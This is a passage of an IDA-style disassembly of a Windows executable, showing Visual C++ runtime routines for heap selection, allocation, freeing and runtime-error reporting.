.text:00402542                 mov     ecx, [eax+3Ch]
.text:00402545                 test    ecx, ecx
.text:00402547                 jz      short loc_402556
.text:00402549                 add     eax, ecx
.text:0040254B                 mov     cl, [eax+1Ah]
.text:0040254E                 mov     [esi], cl
.text:00402550                 mov     al, [eax+1Bh]
.text:00402553                 mov     [esi+1], al
.text:00402556
.text:00402556 loc_402556:                             ; CODE XREF: sub_40252B+15j
.text:00402556                                         ; sub_40252B+1Cj
.text:00402556                 pop     esi
.text:00402557                 retn
.text:00402557 sub_40252B      endp
.text:00402557
.text:00402558
.text:00402558 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00402558
.text:00402558 ; Attributes: bp-based frame
.text:00402558
.text:00402558 sub_402558      proc near               ; CODE XREF: sub_4026A0+20p
.text:00402558
.text:00402558 Buffer          = byte ptr -122Ch
.text:00402558 Filename        = byte ptr -19Ch
.text:00402558 VersionInformation= _OSVERSIONINFOA ptr -98h
.text:00402558 var_4           = dword ptr -4
.text:00402558
.text:00402558                 push    ebp
.text:00402559                 mov     ebp, esp
.text:0040255B                 mov     eax, 122Ch
.text:00402560                 call    __alloca_probe
.text:00402565                 lea     eax, [ebp+VersionInformation]
.text:0040256B                 push    ebx
.text:0040256C                 push    eax             ; lpVersionInformation
.text:0040256D                 mov     [ebp+VersionInformation.dwOSVersionInfoSize], 94h
.text:00402577                 call    ds:GetVersionExA ; Get extended information about the
.text:00402577                                         ; version of the operating system
.text:0040257D                 test    eax, eax
.text:0040257F                 jz      short loc_40259B
.text:00402581                 cmp     [ebp+VersionInformation.dwPlatformId], 2
.text:00402588                 jnz     short loc_40259B
.text:0040258A                 cmp     [ebp+VersionInformation.dwMajorVersion], 5
.text:00402591                 jb      short loc_40259B
.text:00402593                 push    1
.text:00402595                 pop     eax
.text:00402596                 jmp     loc_40269D
.text:0040259B ; ---------------------------------------------------------------------------
.text:0040259B
.text:0040259B loc_40259B:                             ; CODE XREF: sub_402558+27j
.text:0040259B                                         ; sub_402558+30j ...
.text:0040259B                 lea     eax, [ebp+Buffer]
.text:004025A1                 push    1090h           ; nSize
.text:004025A6                 push    eax             ; lpBuffer
.text:004025A7                 push    offset Name     ; "__MSVCRT_HEAP_SELECT"
.text:004025AC                 call    ds:GetEnvironmentVariableA
.text:004025B2                 test    eax, eax
.text:004025B4                 jz      loc_40268A
.text:004025BA                 xor     ebx, ebx
.text:004025BC                 lea     ecx, [ebp+Buffer]
.text:004025C2                 cmp     [ebp+Buffer], bl
.text:004025C8                 jz      short loc_4025DD
.text:004025CA
.text:004025CA loc_4025CA:                             ; CODE XREF: sub_402558+83j
.text:004025CA                 mov     al, [ecx]
.text:004025CC                 cmp     al, 61h
.text:004025CE                 jl      short loc_4025D8
.text:004025D0                 cmp     al, 7Ah
.text:004025D2                 jg      short loc_4025D8
.text:004025D4                 sub     al, 20h
.text:004025D6                 mov     [ecx], al
.text:004025D8
.text:004025D8 loc_4025D8:                             ; CODE XREF: sub_402558+76j
.text:004025D8                                         ; sub_402558+7Aj
.text:004025D8                 inc     ecx
.text:004025D9                 cmp     [ecx], bl
.text:004025DB                 jnz     short loc_4025CA
.text:004025DD
.text:004025DD loc_4025DD:                             ; CODE XREF: sub_402558+70j
.text:004025DD                 lea     eax, [ebp+Buffer]
.text:004025E3                 push    16h             ; size_t
.text:004025E5                 push    eax             ; char *
.text:004025E6                 push    offset a__global_heap_ ; "__GLOBAL_HEAP_SELECTED"
.text:004025EB                 call    _strncmp
.text:004025F0                 add     esp, 0Ch
.text:004025F3                 test    eax, eax
.text:004025F5                 jnz     short loc_4025FF
.text:004025F7                 lea     eax, [ebp+Buffer]
.text:004025FD                 jmp     short loc_402648
.text:004025FF ; ---------------------------------------------------------------------------
.text:004025FF
.text:004025FF loc_4025FF:                             ; CODE XREF: sub_402558+9Dj
.text:004025FF                 lea     eax, [ebp+Filename]
.text:00402605                 push    104h            ; nSize
.text:0040260A                 push    eax             ; lpFilename
.text:0040260B                 push    ebx             ; hModule
.text:0040260C                 call    ds:GetModuleFileNameA
.text:00402612                 cmp     [ebp+Filename], bl
.text:00402618                 lea     ecx, [ebp+Filename]
.text:0040261E                 jz      short loc_402633
.text:00402620
.text:00402620 loc_402620:                             ; CODE XREF: sub_402558+D9j
.text:00402620                 mov     al, [ecx]
.text:00402622                 cmp     al, 61h
.text:00402624                 jl      short loc_40262E
.text:00402626                 cmp     al, 7Ah
.text:00402628                 jg      short loc_40262E
.text:0040262A                 sub     al, 20h
.text:0040262C                 mov     [ecx], al
.text:0040262E
.text:0040262E loc_40262E:                             ; CODE XREF: sub_402558+CCj
.text:0040262E                                         ; sub_402558+D0j
.text:0040262E                 inc     ecx
.text:0040262F                 cmp     [ecx], bl
.text:00402631                 jnz     short loc_402620
.text:00402633
.text:00402633 loc_402633:                             ; CODE XREF: sub_402558+C6j
.text:00402633                 lea     eax, [ebp+Filename]
.text:00402639                 push    eax             ; char *
.text:0040263A                 lea     eax, [ebp+Buffer]
.text:00402640                 push    eax             ; char *
.text:00402641                 call    _strstr
.text:00402646                 pop     ecx
.text:00402647                 pop     ecx
.text:00402648
.text:00402648 loc_402648:                             ; CODE XREF: sub_402558+A5j
.text:00402648                 cmp     eax, ebx
.text:0040264A                 jz      short loc_40268A
.text:0040264C                 push    2Ch             ; int
.text:0040264E                 push    eax             ; char *
.text:0040264F                 call    _strchr
.text:00402654                 pop     ecx
.text:00402655                 cmp     eax, ebx
.text:00402657                 pop     ecx
.text:00402658                 jz      short loc_40268A
.text:0040265A                 inc     eax
.text:0040265B                 mov     ecx, eax
.text:0040265D                 cmp     [eax], bl
.text:0040265F                 jz      short loc_40266F
.text:00402661
.text:00402661 loc_402661:                             ; CODE XREF: sub_402558+115j
.text:00402661                 cmp     byte ptr [ecx], 3Bh
.text:00402664                 jnz     short loc_40266A
.text:00402666                 mov     [ecx], bl
.text:00402668                 jmp     short loc_40266B
.text:0040266A ; ---------------------------------------------------------------------------
.text:0040266A
.text:0040266A loc_40266A:                             ; CODE XREF: sub_402558+10Cj
.text:0040266A                 inc     ecx
.text:0040266B
.text:0040266B loc_40266B:                             ; CODE XREF: sub_402558+110j
.text:0040266B                 cmp     [ecx], bl
.text:0040266D                 jnz     short loc_402661
.text:0040266F
.text:0040266F loc_40266F:                             ; CODE XREF: sub_402558+107j
.text:0040266F                 push    0Ah             ; int
.text:00402671                 push    ebx             ; char **
.text:00402672                 push    eax             ; char *
.text:00402673                 call    _strtol
.text:00402678                 add     esp, 0Ch
.text:0040267B                 cmp     eax, 2
.text:0040267E                 jz      short loc_40269D
.text:00402680                 cmp     eax, 3
.text:00402683                 jz      short loc_40269D
.text:00402685                 cmp     eax, 1
.text:00402688                 jz      short loc_40269D
.text:0040268A
.text:0040268A loc_40268A:                             ; CODE XREF: sub_402558+5Cj
.text:0040268A                                         ; sub_402558+F2j ...
.text:0040268A                 lea     eax, [ebp+var_4]
.text:0040268D                 push    eax
.text:0040268E                 call    sub_40252B
.text:00402693                 cmp     byte ptr [ebp+var_4], 6
.text:00402697                 pop     ecx
.text:00402698                 sbb     eax, eax
.text:0040269A                 add     eax, 3
.text:0040269D
.text:0040269D loc_40269D:                             ; CODE XREF: sub_402558+3Ej
.text:0040269D                                         ; sub_402558+126j ...
.text:0040269D                 pop     ebx
.text:0040269E                 leave
.text:0040269F                 retn
.text:0040269F sub_402558      endp
.text:0040269F
.text:004026A0
.text:004026A0 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:004026A0
.text:004026A0
.text:004026A0 sub_4026A0      proc near               ; CODE XREF: start+59p
.text:004026A0
.text:004026A0 arg_0           = dword ptr  4
.text:004026A0
.text:004026A0                 xor     eax, eax
.text:004026A2                 push    0               ; dwMaximumSize
.text:004026A4                 cmp     [esp+4+arg_0], eax
.text:004026A8                 push    1000h           ; dwInitialSize
.text:004026AD                 setz    al
.text:004026B0                 push    eax             ; flOptions
.text:004026B1                 call    ds:HeapCreate
.text:004026B7                 test    eax, eax
.text:004026B9                 mov     hHeap, eax
.text:004026BE                 jz      short loc_4026F6
.text:004026C0                 call    sub_402558
.text:004026C5                 cmp     eax, 3
.text:004026C8                 mov     dword_409DCC, eax
.text:004026CD                 jnz     short loc_4026DC
.text:004026CF                 push    3F8h
.text:004026D4                 call    ___sbh_heap_init
.text:004026D9                 pop     ecx
.text:004026DA                 jmp     short loc_4026E6
.text:004026DC ; ---------------------------------------------------------------------------
.text:004026DC
.text:004026DC loc_4026DC:                             ; CODE XREF: sub_4026A0+2Dj
.text:004026DC                 cmp     eax, 2
.text:004026DF                 jnz     short loc_4026F9
.text:004026E1                 call    sub_4044F0
.text:004026E6
.text:004026E6 loc_4026E6:                             ; CODE XREF: sub_4026A0+3Aj
.text:004026E6                 test    eax, eax
.text:004026E8                 jnz     short loc_4026F9
.text:004026EA                 push    hHeap           ; hHeap
.text:004026F0                 call    ds:HeapDestroy
.text:004026F6
.text:004026F6 loc_4026F6:                             ; CODE XREF: sub_4026A0+1Ej
.text:004026F6                 xor     eax, eax
.text:004026F8                 retn
.text:004026F9 ; ---------------------------------------------------------------------------
.text:004026F9
.text:004026F9 loc_4026F9:                             ; CODE XREF: sub_4026A0+3Fj
.text:004026F9                                         ; sub_4026A0+48j
.text:004026F9                 push    1
.text:004026FB                 pop     eax
.text:004026FC                 retn
.text:004026FC sub_4026A0      endp
.text:004026FC
.text:004026FC ; ---------------------------------------------------------------------------
.text:004026FD                 align 10h
.text:00402700 ; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2. PRESS KEYPAD "+" TO EXPAND]
.text:00402720 ; [00000022 BYTES: COLLAPSED FUNCTION __unwind_handler. PRESS KEYPAD "+" TO EXPAND]
.text:00402742 ; [00000068 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS KEYPAD "+" TO EXPAND]
.text:004027AA ; [00000023 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS KEYPAD "+" TO EXPAND]
.text:004027CD ; ---------------------------------------------------------------------------
.text:004027CD
.text:004027CD __NLG_Notify1:
.text:004027CD                 push    ebx
.text:004027CE                 push    ecx
.text:004027CF                 mov     ebx, offset unk_407454
.text:004027D4                 jmp     short loc_4027E0
.text:004027D6 ; [00000018 BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS KEYPAD "+" TO EXPAND]
.text:004027EE                 align 10h
.text:004027F0                 push    esi
.text:004027F1                 inc     ebx
.text:004027F2                 xor     dh, [eax]
.text:004027F4                 pop     eax
.text:004027F5                 inc     ebx
.text:004027F6                 xor     [eax], dh
.text:004027F8 ; [000000BD BYTES: COLLAPSED FUNCTION unknown_libname_1. PRESS KEYPAD "+" TO EXPAND]
.text:004028B5 ; ---------------------------------------------------------------------------
.text:004028B5
.text:004028B5 unknown_libname_2:                      ; Microsoft VisualC 2-8/net runtime
.text:004028B5                 push    ebp
.text:004028B6                 mov     ecx, [esp+8]
.text:004028BA                 mov     ebp, [ecx]
.text:004028BC                 mov     eax, [ecx+1Ch]
.text:004028BF                 push    eax
.text:004028C0                 mov     eax, [ecx+18h]
.text:004028C3                 push    eax
.text:004028C4                 call    __local_unwind2
.text:004028C9                 add     esp, 8
.text:004028CC                 pop     ebp
.text:004028CD                 retn    4
.text:004028D0 ; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS KEYPAD "+" TO EXPAND]
.text:00402909
.text:00402909 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00402909
.text:00402909 ; Attributes: bp-based frame
.text:00402909
.text:00402909 ; int __cdecl sub_402909(DWORD NumberOfBytesWritten)
.text:00402909 sub_402909      proc near               ; CODE XREF: __amsg_exit+12p
.text:00402909                                         ; _fast_error_exit+12p ...
.text:00402909
.text:00402909 Filename        = byte ptr -1A4h
.text:00402909 var_A0          = byte ptr -0A0h
.text:00402909 NumberOfBytesWritten= dword ptr  8
.text:00402909
.text:00402909                 push    ebp
.text:0040290A                 mov     ebp, esp
.text:0040290C                 sub     esp, 1A4h
.text:00402912                 mov     edx, [ebp+NumberOfBytesWritten]
.text:00402915                 xor     ecx, ecx
.text:00402917                 mov     eax, offset dword_407468
.text:0040291C
.text:0040291C loc_40291C:                             ; CODE XREF: sub_402909+20j
.text:0040291C                 cmp     edx, [eax]
.text:0040291E                 jz      short loc_40292B
.text:00402920                 add     eax, 8
.text:00402923                 inc     ecx
.text:00402924                 cmp     eax, offset unk_4074F8
.text:00402929                 jb      short loc_40291C
.text:0040292B
.text:0040292B loc_40292B:                             ; CODE XREF: sub_402909+15j
.text:0040292B                 push    esi
.text:0040292C                 mov     esi, ecx
.text:0040292E                 shl     esi, 3
.text:00402931                 cmp     edx, dword_407468[esi]
.text:00402937                 jnz     loc_402A59
.text:0040293D                 mov     eax, dword_4099E0
.text:00402942                 cmp     eax, 1
.text:00402945                 jz      loc_402A33
.text:0040294B                 test    eax, eax
.text:0040294D                 jnz     short loc_40295C
.text:0040294F                 cmp     dword_407134, 1
.text:00402956                 jz      loc_402A33
.text:0040295C
.text:0040295C loc_40295C:                             ; CODE XREF: sub_402909+44j
.text:0040295C                 cmp     edx, 0FCh
.text:00402962                 jz      loc_402A59
.text:00402968                 lea     eax, [ebp+Filename]
.text:0040296E                 push    104h            ; nSize
.text:00402973                 push    eax             ; lpFilename
.text:00402974                 push    0               ; hModule
.text:00402976                 call    ds:GetModuleFileNameA
.text:0040297C                 test    eax, eax
.text:0040297E                 jnz     short loc_402993
.text:00402980                 lea     eax, [ebp+Filename]
.text:00402986                 push    offset aProgramNameUnk ; "<program name unknown>"
.text:0040298B                 push    eax             ; char *
.text:0040298C                 call    _strcpy
.text:00402991                 pop     ecx
.text:00402992                 pop     ecx
.text:00402993
.text:00402993 loc_402993:                             ; CODE XREF: sub_402909+75j
.text:00402993                 lea     eax, [ebp+Filename]
.text:00402999                 push    edi
.text:0040299A                 push    eax             ; char *
.text:0040299B                 lea     edi, [ebp+Filename]
.text:004029A1                 call    _strlen
.text:004029A6                 inc     eax
.text:004029A7                 pop     ecx
.text:004029A8                 cmp     eax, 3Ch
.text:004029AB                 jbe     short loc_4029D6
.text:004029AD                 lea     eax, [ebp+Filename]
.text:004029B3                 push    eax             ; char *
.text:004029B4                 call    _strlen
.text:004029B9                 mov     edi, eax
.text:004029BB                 lea     eax, [ebp+Filename]
.text:004029C1                 sub     eax, 3Bh
.text:004029C4                 push    3               ; size_t
.text:004029C6                 add     edi, eax
.text:004029C8                 push    offset a___     ; "..."
.text:004029CD                 push    edi             ; char *
.text:004029CE                 call    _strncpy
.text:004029D3                 add     esp, 10h
.text:004029D6
.text:004029D6 loc_4029D6:                             ; CODE XREF: sub_402909+A2j
.text:004029D6                 lea     eax, [ebp+var_A0]
.text:004029DC                 push    offset aRuntimeErrorPr ; "Runtime Error!\n\nProgram: "
.text:004029E1                 push    eax             ; char *
.text:004029E2                 call    _strcpy
.text:004029E7                 lea     eax, [ebp+var_A0]
.text:004029ED                 push    edi             ; char *
.text:004029EE                 push    eax             ; char *
.text:004029EF                 call    _strcat
.text:004029F4                 lea     eax, [ebp+var_A0]
.text:004029FA                 push    offset asc_406434 ; "\n\n"
.text:004029FF                 push    eax             ; char *
.text:00402A00                 call    _strcat
.text:00402A05                 push    off_40746C[esi] ; char *
.text:00402A0B                 lea     eax, [ebp+var_A0]
.text:00402A11                 push    eax             ; char *
.text:00402A12                 call    _strcat
.text:00402A17                 push    12010h
.text:00402A1C                 lea     eax, [ebp+var_A0]
.text:00402A22                 push    offset aMicrosoftVisua ; "Microsoft Visual C++ Runtime Library"
.text:00402A27                 push    eax
.text:00402A28                 call    ___crtMessageBoxA
.text:00402A2D                 add     esp, 2Ch
.text:00402A30                 pop     edi
.text:00402A31                 jmp     short loc_402A59
.text:00402A33 ; ---------------------------------------------------------------------------
.text:00402A33
.text:00402A33 loc_402A33:                             ; CODE XREF: sub_402909+3Cj
.text:00402A33                                         ; sub_402909+4Dj
.text:00402A33                 lea     eax, [ebp+NumberOfBytesWritten]
.text:00402A36                 lea     esi, off_40746C[esi]
.text:00402A3C                 push    0               ; lpOverlapped
.text:00402A3E                 push    eax             ; lpNumberOfBytesWritten
.text:00402A3F                 push    dword ptr [esi] ; char *
.text:00402A41                 call    _strlen
.text:00402A46                 pop     ecx
.text:00402A47                 push    eax             ; nNumberOfBytesToWrite
.text:00402A48                 push    dword ptr [esi] ; lpBuffer
.text:00402A4A                 push    0FFFFFFF4h      ; nStdHandle
.text:00402A4C                 call    ds:GetStdHandle
.text:00402A52                 push    eax             ; hFile
.text:00402A53                 call    ds:WriteFile
.text:00402A59
.text:00402A59 loc_402A59:                             ; CODE XREF: sub_402909+2Ej
.text:00402A59                                         ; sub_402909+59j ...
.text:00402A59                 pop     esi
.text:00402A5A                 leave
.text:00402A5B                 retn
.text:00402A5B sub_402909      endp
.text:00402A5B
.text:00402A5C ; [00000012 BYTES: COLLAPSED FUNCTION _malloc. PRESS KEYPAD "+" TO EXPAND]
.text:00402A6E ; [0000002C BYTES: COLLAPSED FUNCTION __nh_malloc. PRESS KEYPAD "+" TO EXPAND]
.text:00402A9A
.text:00402A9A ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00402A9A
.text:00402A9A
.text:00402A9A sub_402A9A      proc near               ; CODE XREF: __nh_malloc+Bp
.text:00402A9A
.text:00402A9A arg_0           = dword ptr  4
.text:00402A9A
.text:00402A9A                 mov     eax, dword_409DCC
.text:00402A9F                 push    esi
.text:00402AA0                 mov     esi, [esp+4+arg_0]
.text:00402AA4                 cmp     eax, 3
.text:00402AA7                 jnz     short loc_402ABE
.text:00402AA9                 cmp     esi, dword_409BA8
.text:00402AAF                 ja      short loc_402AF0
.text:00402AB1                 push    esi
.text:00402AB2                 call    ___sbh_alloc_block
.text:00402AB7                 test    eax, eax
.text:00402AB9                 pop     ecx
.text:00402ABA                 jz      short loc_402AF0
.text:00402ABC                 pop     esi
.text:00402ABD                 retn
.text:00402ABE ; ---------------------------------------------------------------------------
.text:00402ABE
.text:00402ABE loc_402ABE:                             ; CODE XREF: sub_402A9A+Dj
.text:00402ABE                 cmp     eax, 2
.text:00402AC1                 jnz     short loc_402AF0
.text:00402AC3                 mov     eax, [esp+4+arg_0]
.text:00402AC7                 test    eax, eax
.text:00402AC9                 jz      short loc_402AD3
.text:00402ACB                 lea     esi, [eax+0Fh]
.text:00402ACE                 and     esi, 0FFFFFFF0h
.text:00402AD1                 jmp     short loc_402AD6
.text:00402AD3 ; ---------------------------------------------------------------------------
.text:00402AD3
.text:00402AD3 loc_402AD3:                             ; CODE XREF: sub_402A9A+2Fj
.text:00402AD3                 push    10h
.text:00402AD5                 pop     esi
.text:00402AD6
.text:00402AD6 loc_402AD6:                             ; CODE XREF: sub_402A9A+37j
.text:00402AD6                 cmp     esi, dword_409854
.text:00402ADC                 ja      short loc_402AFD
.text:00402ADE                 mov     eax, esi
.text:00402AE0                 shr     eax, 4
.text:00402AE3                 push    eax
.text:00402AE4                 call    sub_4047E8
.text:00402AE9                 test    eax, eax
.text:00402AEB                 pop     ecx
.text:00402AEC                 jnz     short loc_402B0C
.text:00402AEE                 jmp     short loc_402AFD
.text:00402AF0 ; ---------------------------------------------------------------------------
.text:00402AF0
.text:00402AF0 loc_402AF0:                             ; CODE XREF: sub_402A9A+15j
.text:00402AF0                                         ; sub_402A9A+20j ...
.text:00402AF0                 test    esi, esi
.text:00402AF2                 jnz     short loc_402AF7
.text:00402AF4                 push    1
.text:00402AF6                 pop     esi
.text:00402AF7
.text:00402AF7 loc_402AF7:                             ; CODE XREF: sub_402A9A+58j
.text:00402AF7                 add     esi, 0Fh
.text:00402AFA                 and     esi, 0FFFFFFF0h
.text:00402AFD
.text:00402AFD loc_402AFD:                             ; CODE XREF: sub_402A9A+42j
.text:00402AFD                                         ; sub_402A9A+54j
.text:00402AFD                 push    esi             ; dwBytes
.text:00402AFE                 push    0               ; dwFlags
.text:00402B00                 push    hHeap           ; hHeap
.text:00402B06                 call    ds:HeapAlloc
.text:00402B0C
.text:00402B0C loc_402B0C:                             ; CODE XREF: sub_402A9A+52j
.text:00402B0C                 pop     esi
.text:00402B0D                 retn
.text:00402B0D sub_402A9A      endp
.text:00402B0D
.text:00402B0E ; [00000026 BYTES: COLLAPSED FUNCTION __isatty. PRESS KEYPAD "+" TO EXPAND]
.text:00402B34 ; [0000003B BYTES: COLLAPSED FUNCTION _fflush. PRESS KEYPAD "+" TO EXPAND]
.text:00402B6F ; [0000005C BYTES: COLLAPSED FUNCTION __flush. PRESS KEYPAD "+" TO EXPAND]
.text:00402BCB
.text:00402BCB ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00402BCB
.text:00402BCB
.text:00402BCB sub_402BCB      proc near               ; CODE XREF: .text:___endstdiop
.text:00402BCB                 push    1
.text:00402BCD                 call    _flsall
.text:00402BD2                 pop     ecx
.text:00402BD3                 retn
.text:00402BD3 sub_402BCB      endp
.text:00402BD3
.text:00402BD4 ; [0000006D BYTES: COLLAPSED FUNCTION _flsall. PRESS KEYPAD "+" TO EXPAND]
.text:00402C41
.text:00402C41 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00402C41
.text:00402C41 ; Attributes: bp-based frame
.text:00402C41
.text:00402C41 sub_402C41      proc near               ; CODE XREF: sub_4013A2+75Bp
.text:00402C41                                         ; __setenvp+9Dp ...
.text:00402C41
.text:00402C41 var_4           = dword ptr -4
.text:00402C41 arg_0           = dword ptr  8
.text:00402C41
.text:00402C41                 push    ebp
.text:00402C42                 mov     ebp, esp
.text:00402C44                 push    ecx
.text:00402C45                 push    esi
.text:00402C46                 mov     esi, [ebp+arg_0]
.text:00402C49                 test    esi, esi
.text:00402C4B                 jz      short loc_402CA7
.text:00402C4D                 mov     eax, dword_409DCC
.text:00402C52                 cmp     eax, 3
.text:00402C55                 jnz     short loc_402C6D
.text:00402C57                 push    esi
.text:00402C58                 call    ___sbh_find_block
.text:00402C5D                 pop     ecx
.text:00402C5E                 test    eax, eax
.text:00402C60                 push    esi
.text:00402C61                 jz      short loc_402C99
.text:00402C63                 push    eax
.text:00402C64                 call    sub_403D12
.text:00402C69                 pop     ecx
.text:00402C6A                 pop     ecx
.text:00402C6B                 jmp     short loc_402CA7
.text:00402C6D ; ---------------------------------------------------------------------------
.text:00402C6D
.text:00402C6D loc_402C6D:                             ; CODE XREF: sub_402C41+14j
.text:00402C6D                 cmp     eax, 2
.text:00402C70                 jnz     short loc_402C98
.text:00402C72                 lea     eax, [ebp+arg_0]
.text:00402C75                 push    eax
.text:00402C76                 lea     eax, [ebp+var_4]
.text:00402C79                 push    eax
.text:00402C7A                 push    esi
.text:00402C7B                 call    sub_40474C
.text:00402C80                 add     esp, 0Ch
.text:00402C83                 test    eax, eax
.text:00402C85                 jz      short loc_402C98
.text:00402C87                 push    eax
.text:00402C88                 push    [ebp+arg_0]
.text:00402C8B                 push    [ebp+var_4]
.text:00402C8E                 call    sub_4047A3
.text:00402C93                 add     esp, 0Ch
.text:00402C96                 jmp     short loc_402CA7
.text:00402C98 ; ---------------------------------------------------------------------------
.text:00402C98
.text:00402C98 loc_402C98:                             ; CODE XREF: sub_402C41+2Fj
.text:00402C98                                         ; sub_402C41+44j
.text:00402C98                 push    esi             ; lpMem
.text:00402C99
.text:00402C99 loc_402C99:                             ; CODE XREF: sub_402C41+20j
.text:00402C99                 push    0               ; dwFlags
.text:00402C9B                 push    hHeap           ; hHeap
.text:00402CA1                 call    ds:HeapFree
.text:00402CA7
.text:00402CA7 loc_402CA7:                             ; CODE XREF: sub_402C41+Aj
.text:00402CA7                                         ; sub_402C41+2Aj ...
.text:00402CA7                 pop     esi
.text:00402CA8                 leave
.text:00402CA9                 retn
.text:00402CA9 sub_402C41      endp
.text:00402CA9
.text:00402CA9 ; ---------------------------------------------------------------------------
.text:00402CAA                 align 10h
.text:00402CB0 ; [0000007B BYTES: COLLAPSED FUNCTION _strlen. PRESS KEYPAD "+" TO EXPAND]
.text:00402D2B ; [00000068 BYTES: COLLAPSED FUNCTION _wctomb. PRESS KEYPAD "+" TO EXPAND]
.text:00402D93                 align 10h
.text:00402DA0 ; [00000068 BYTES: COLLAPSED FUNCTION __aulldiv. PRESS KEYPAD "+" TO EXPAND]
.text:00402E08                 align 10h
.text:00402E10 ; [00000075 BYTES: COLLAPSED FUNCTION __aullrem. PRESS KEYPAD "+" TO EXPAND]
.text:00402E85 ; [00000115 BYTES: COLLAPSED FUNCTION __flsbuf. PRESS KEYPAD "+" TO EXPAND]
.text:00402F9A
.text:00402F9A ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00402F9A
.text:00402F9A ; Attributes: bp-based frame
.text:00402F9A
.text:00402F9A ; int __cdecl sub_402F9A(size_t,int)
.text:00402F9A sub_402F9A      proc near               ; CODE XREF: .text:00401C2Bp
.text:00402F9A                                         ; .text:00401C44p
.text:00402F9A
.text:00402F9A arg_0           = dword ptr  8
.text:00402F9A arg_4           = dword ptr  0Ch
.text:00402F9A
.text:00402F9A                 push    ebp
.text:00402F9B                 mov     ebp, esp
.text:00402F9D                 push    esi
.text:00402F9E                 mov     esi, [ebp+arg_0]
.text:00402FA1                 imul    esi, [ebp+arg_4]
.text:00402FA5                 cmp     esi, 0FFFFFFE0h
.text:00402FA8                 push    edi
.text:00402FA9                 mov     [ebp+arg_0], esi
.text:00402FAC                 ja      short loc_402FBB
.text:00402FAE                 test    esi, esi
.text:00402FB0                 jnz     short loc_402FB5
.text:00402FB2                 push    1
.text:00402FB4                 pop     esi
.text:00402FB5
.text:00402FB5 loc_402FB5:                             ; CODE XREF: sub_402F9A+16j
.text:00402FB5                 add     esi, 0Fh
.text:00402FB8                 and     esi, 0FFFFFFF0h
.text:00402FBB
.text:00402FBB loc_402FBB:                             ; CODE XREF: sub_402F9A+12j
.text:00402FBB                                         ; sub_402F9A+94j
.text:00402FBB                 xor     edi, edi
.text:00402FBD                 cmp     esi, 0FFFFFFE0h
.text:00402FC0                 ja      short loc_40301A
.text:00402FC2                 mov     eax, dword_409DCC
.text:00402FC7                 cmp     eax, 3
.text:00402FCA                 jnz     short loc_402FE6
.text:00402FCC                 mov     eax, [ebp+arg_0]
.text:00402FCF                 cmp     eax, dword_409BA8
.text:00402FD5                 ja      short loc_403005
.text:00402FD7                 push    eax
.text:00402FD8                 call    ___sbh_alloc_block
.text:00402FDD                 mov     edi, eax
.text:00402FDF                 pop     ecx
.text:00402FE0                 test    edi, edi
.text:00402FE2                 jnz     short loc_403030
.text:00402FE4                 jmp     short loc_403005
.text:00402FE6 ; ---------------------------------------------------------------------------
.text:00402FE6
.text:00402FE6 loc_402FE6:                             ; CODE XREF: sub_402F9A+30j
.text:00402FE6                 cmp     eax, 2
.text:00402FE9                 jnz     short loc_403005
.text:00402FEB                 cmp     esi, dword_409854
.text:00402FF1                 ja      short loc_403005
.text:00402FF3                 mov     eax, esi
.text:00402FF5                 shr     eax, 4
.text:00402FF8                 push    eax
.text:00402FF9                 call    sub_4047E8
.text:00402FFE                 mov     edi, eax
.text:00403000                 pop     ecx
.text:00403001                 test    edi, edi
.text:00403003                 jnz     short loc_403044
.text:00403005
.text:00403005 loc_403005:                             ; CODE XREF: sub_402F9A+3Bj
.text:00403005                                         ; sub_402F9A+4Aj ...
.text:00403005                 push    esi             ; dwBytes
.text:00403006                 push    8               ; dwFlags
.text:00403008                 push    hHeap           ; hHeap
.text:0040300E                 call    ds:HeapAlloc
.text:00403014                 mov     edi, eax
.text:00403016                 test    edi, edi
.text:00403018                 jnz     short loc_40303E
.text:0040301A
.text:0040301A loc_40301A:                             ; CODE XREF: sub_402F9A+26j
.text:0040301A                 cmp     dword_409B60, 0
.text:00403021                 jz      short loc_40303E
.text:00403023                 push    esi
.text:00403024                 call    __callnewh
.text:00403029                 test    eax, eax
.text:0040302B                 pop     ecx
.text:0040302C                 jz      short loc_403047
.text:0040302E                 jmp     short loc_402FBB
.text:00403030 ; ---------------------------------------------------------------------------
.text:00403030
.text:00403030 loc_403030:                             ; CODE XREF: sub_402F9A+48j
.text:00403030                 push    [ebp+arg_0]     ; size_t
.text:00403033
.text:00403033 loc_403033:                             ; CODE XREF: sub_402F9A+ABj
.text:00403033                 push    0               ; int
.text:00403035                 push    edi             ; void *
.text:00403036                 call    _memset
.text:0040303B                 add     esp, 0Ch
.text:0040303E
.text:0040303E loc_40303E:                             ; CODE XREF: sub_402F9A+7Ej
